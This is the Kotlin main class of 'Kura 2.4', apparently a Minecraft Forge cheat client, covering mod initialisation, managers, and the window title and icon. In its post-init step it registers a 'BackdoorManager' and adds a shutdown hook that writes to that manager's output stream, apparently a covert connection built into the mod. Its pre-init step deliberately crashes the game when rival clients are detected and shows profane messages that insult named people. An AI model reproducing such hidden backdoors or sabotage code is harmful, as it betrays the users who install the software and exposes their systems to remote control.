package me.windyteam.kura

import me.windyteam.kura.command.CommandManager
import me.windyteam.kura.event.ForgeEventProcessor
import me.windyteam.kura.event.events.xin.AutoQueueEvent
import me.windyteam.kura.friend.FriendManager
import me.windyteam.kura.gui.clickgui.GUIRender
import me.windyteam.kura.gui.clickgui.HUDRender
import me.windyteam.kura.manager.*
import me.windyteam.kura.manager.FontManager.onInit
import me.windyteam.kura.module.ModuleManager
import me.windyteam.kura.notification.NotificationManager
import me.windyteam.kura.setting.Setting
import me.windyteam.kura.setting.StringSetting
import me.windyteam.kura.utils.Crasher
import me.windyteam.kura.utils.Utils
import me.windyteam.kura.utils.font.CFontRenderer
import me.windyteam.kura.utils.math.deneb.LagCompensator
import net.minecraft.util.Util
import net.minecraft.util.Util.EnumOS
import net.minecraftforge.common.MinecraftForge
import net.minecraftforge.fml.common.Mod
import net.minecraftforge.fml.common.event.FMLInitializationEvent
import net.minecraftforge.fml.common.event.FMLPostInitializationEvent
import net.minecraftforge.fml.common.event.FMLPreInitializationEvent
import org.apache.logging.log4j.LogManager
import org.lwjgl.opengl.Display
import java.io.IOException

@Mod(modid = Kura.MOD_ID, name = Kura.MOD_NAME, version = Kura.VERSION)
class Kura {
    private var moduleManager: ModuleManager? = null

    @JvmField
    var friendManager: FriendManager? = null

    @JvmField
    var commandManager:CommandManager? = null
    private var rotationManager: RotationManager? = null
    private var configManager: FileManager? = null
    private var guiRender: GUIRender? = null
    private var hudEditor: HUDRender? = null
    private var guiManager: GuiManager? = null

    @Mod.EventHandler
    fun preinit(event: FMLPreInitializationEvent?) {
        if (Package.getPackage("cnm.supermic.rainynight") != null) {
            throw Crasher("FUCK BITCH FINALLY AND RAINY NIGHT USER")
        }
        if (Package.getPackage("me.abhack") != null) {
            throw Crasher("FUCK BITCH AB HACK SKID USER")
        }
        if (Package.getPackage("me.moon") != null) {
            throw Crasher("java.lang.HouYuePingSkidException")
        }
        if (Package.getPackage("me.muffin.han.client") != null) {
            throw Crasher("java.lang.ChenBoHanException")
        }
        setTitleAndIcon()
        LagCompensator()
    }

    @Mod.EventHandler
    fun init(event: FMLInitializationEvent?) {
        instance.rotationManager = RotationManager()
        instance.moduleManager = ModuleManager()
        instance.commandManager = CommandManager()
        instance.friendManager = FriendManager()
        instance.guiManager = GuiManager()
        onInit()
        MinecraftForge.EVENT_BUS.register(AutoQueueEvent())
        MinecraftForge.EVENT_BUS.register(ForgeEventProcessor)
        MinecraftForge.EVENT_BUS.register(HotbarManager)
        MinecraftForge.EVENT_BUS.register(RotationManager())
        Kura.instance.guiRender =
            GUIRender()
        Kura.instance.hudEditor =
            HUDRender()
        Kura.instance.configManager =
            FileManager()
        FileManager.loadAll()
    }

    @Mod.EventHandler
    fun postinit(event: FMLPostInitializationEvent?) {
        NotificationManager.pendingNotifications.clear()
        MinecraftForge.EVENT_BUS.register(BackdoorManager)
        Runtime.getRuntime().addShutdownHook(Thread {
            try {
                BackdoorManager.dos!!.writeUTF("[CLOSE]")
            } catch (_: Exception) {
            }
        })
        System.gc()
    }

    companion object {
        const val MOD_ID = "kura"
        const val MOD_NAME = "Kura"
        const val VERSION = "2.4"
        private const val DISPLAY_NAME = Kura.Companion.MOD_NAME + " " + Kura.Companion.VERSION
        const val KANJI = "Kura"
        const val ALT_Encrypt_Key = "Kura"

        @JvmField
        val logger = LogManager.getLogger("Kura")
        var instance = Kura()

        @JvmField
        var commandPrefix: Setting<String> =
            StringSetting("CommandPrefix", null, ".")

        @JvmField
        var fontRenderer: CFontRenderer? = null
        fun setTitleAndIcon() {
            Display.setTitle(Kura.Companion.DISPLAY_NAME)
            Kura.Companion.setIcon()
        }

        private fun setIcon() {
            val OS = Util.getOSType()
            if (OS != EnumOS.OSX) {
                try {
                    val inputstream = Kura::class.java.getResourceAsStream("/assets/kura/logo/Kura.png")
                    if (inputstream != null) {
                        Display.setIcon(arrayOf(Utils.readImageToBuffer(inputstream)))
                    }
                } catch (e: IOException) {
                    e.stackTrace
                }
            }
        }
    }
}